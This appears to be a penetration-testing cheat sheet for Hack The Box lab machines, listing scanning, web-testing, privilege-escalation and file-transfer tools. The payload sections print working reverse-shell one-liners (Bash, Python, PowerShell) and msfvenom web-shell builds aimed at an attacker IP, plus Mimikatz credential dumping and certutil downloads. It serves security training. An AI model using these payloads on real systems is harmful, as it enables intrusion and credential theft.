# Tools & Utilities

Essential tools used throughout HTB machine exploitation and analysis.

---

## Reconnaissance & Enumeration

### Network Scanning
| Tool | Purpose | Key Commands |
|------|---------|--------------|
| **Nmap** | Network discovery & port scanning | `nmap -sC -sV -oA scan <target>` |
| **Masscan** | High-speed port scanner | `masscan -p1-65535 <target> --rate=1000` |
| **Rustscan** | Fast Rust-based port scanner | `rustscan -a <target> -- -sC -sV` |

### Service Enumeration
| Tool | Purpose | Key Commands |
|------|---------|--------------|
| **Gobuster** | Directory/file brute forcing | `gobuster dir -u <url> -w <wordlist>` |
| **Ffuf** | Web fuzzer | `ffuf -w <wordlist> -u <url>/FUZZ` |
| **Enum4linux** | SMB enumeration | `enum4linux -a <target>` |
| **Smbclient** | SMB client | `smbclient -L //<target>` |

---

## Web Application Testing

### Scanners & Proxies
| Tool | Purpose | Description |
|------|---------|-------------|
| **Burp Suite** | Web app testing platform | Intercepting proxy, scanner, repeater |
| **OWASP ZAP** | Web app security scanner | Open source web app scanner |
| **Nikto** | Web server scanner | `nikto -h <target>` |

### Content Discovery
| Tool | Purpose | Key Commands |
|------|---------|--------------|
| **Dirb** | Web content scanner | `dirb <url> <wordlist>` |
| **Dirbuster** | GUI directory brute forcer | Java-based directory enumeration |
| **Wfuzz** | Web application fuzzer | `wfuzz -w <wordlist> <url>/FUZZ` |

---

## Exploitation Frameworks

### Metasploit
```bash
# Basic Metasploit workflow
msfconsole
search <vulnerability>
use <exploit>
set RHOSTS <target>
set LHOST <attacker_ip>
exploit
```

### Custom Exploits
| Language | Use Case | Examples |
|----------|----------|----------|
| **Python** | Most common for custom exploits | Buffer overflows, web exploits |
| **Bash** | Quick shell scripts | Simple enumeration, file transfers |
| **PowerShell** | Windows-specific exploits | Windows privilege escalation |

---

## Post-Exploitation

### Linux Enumeration
| Tool | Purpose | Command |
|------|---------|---------|
| **LinEnum** | Linux privilege escalation | `./LinEnum.sh` |
| **LinPEAS** | Linux privilege escalation | `./linpeas.sh` |
| **Pspy** | Process monitoring | `./pspy64` |

### Windows Enumeration
| Tool | Purpose | Command |
|------|---------|---------|
| **WinPEAS** | Windows privilege escalation | `winPEAS.exe` |
| **PowerUp** | PowerShell privilege escalation | `Invoke-AllChecks` |
| **Seatbelt** | Windows enumeration | `Seatbelt.exe -group=all` |

### Credential Harvesting
| Tool | Purpose | Use Case |
|------|---------|----------|
| **Mimikatz** | Windows credential extraction | `sekurlsa::logonpasswords` |
| **LaZagne** | Multi-platform password recovery | Stored passwords |
| **Hashcat** | Password cracking | Hash cracking |
| **John the Ripper** | Password cracking | Hash cracking |

---

## Payload Generation & Delivery

### Reverse Shells
```bash
# Common reverse shell payloads
# Bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### MSFVenom
```bash
# Common msfvenom payloads
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf

# Windows EXE
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe

# PHP web shell
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
```

---

## File Transfer Methods

### Linux to Linux
```bash
# HTTP Server (Python)
python3 -m http.server 8000
wget http://<attacker_ip>:8000/<file>

# Netcat
# Receiver: nc -l -p <port> > <file>
# Sender: nc <ip> <port> < <file>

# SCP
scp <file> user@<target>:/path/
```

### Windows File Transfer
```powershell
# PowerShell download
Invoke-WebRequest -Uri "http://<attacker_ip>/<file>" -OutFile "<file>"
(New-Object System.Net.WebClient).DownloadFile("http://<attacker_ip>/<file>", "<file>")

# Certutil
certutil -urlcache -split -f "http://<attacker_ip>/<file>" <file>

# SMB Share
net use \\<attacker_ip>\share
copy \\<attacker_ip>\share\<file> .
```

---

## Privilege Escalation Resources

### Linux
- **GTFOBins**: https://gtfobins.github.io/
- **PEASS-ng**: https://github.com/carlospolop/PEASS-ng
- **Linux Smart Enumeration**: https://github.com/diego-treitos/linux-smart-enumeration

### Windows  
- **LOLBAS**: https://lolbas-project.github.io/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **Windows Exploit Suggester**: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

---

## Additional Resources

- **ExploitDB**: https://www.exploit-db.com/
- **CVE Details**: https://www.cvedetails.com/
- **Packet Storm**: https://packetstormsecurity.com/
- **SecLists**: https://github.com/danielmiessler/SecLists